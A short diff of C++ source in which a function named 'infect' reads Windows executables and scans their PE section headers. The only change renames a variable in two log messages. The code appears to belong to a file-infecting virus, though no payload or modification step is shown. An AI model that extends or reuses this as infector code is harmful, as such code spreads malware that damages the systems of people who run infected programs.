@@ -280,7 +280,7 @@ int infect(void)
 
       if (!ReadFile(exe_handle, exe_buffer, file_size, &bytes_read, nullptr))
       {
-         std::wcout << "\tFailed to read " << found_executable << std::endl;
+         std::wcout << "\tFailed to read " << executable << std::endl;
          goto free_file;
       }
 
@@ -289,7 +289,7 @@ int infect(void)
       std::size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
       IMAGE_SECTION_HEADER *section_table = reinterpret_cast<PIMAGE_SECTION_HEADER>(exe_buffer+dos_header->e_lfanew+nt_headers_size);
 
-      std::wcout << "\tScanning " << found_executable << "..." << std::endl;
+      std::wcout << "\tScanning " << executable << "..." << std::endl;
 
       for (std::size_t i=0; i<nt_headers->FileHeader.NumberOfSections; ++i)
       {
